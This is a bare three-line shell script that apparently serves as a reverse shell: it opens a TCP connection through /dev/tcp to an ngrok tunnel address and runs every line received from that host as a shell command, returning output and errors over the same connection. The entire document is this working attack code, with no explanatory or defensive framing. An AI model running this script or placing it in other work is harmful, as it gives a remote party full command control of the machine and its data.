#!/bin/sh
exec 5<>/dev/tcp/0.tcp.ngrok.io/18035
cat <&5 | while read line; do $line 2>&5 >&5; done




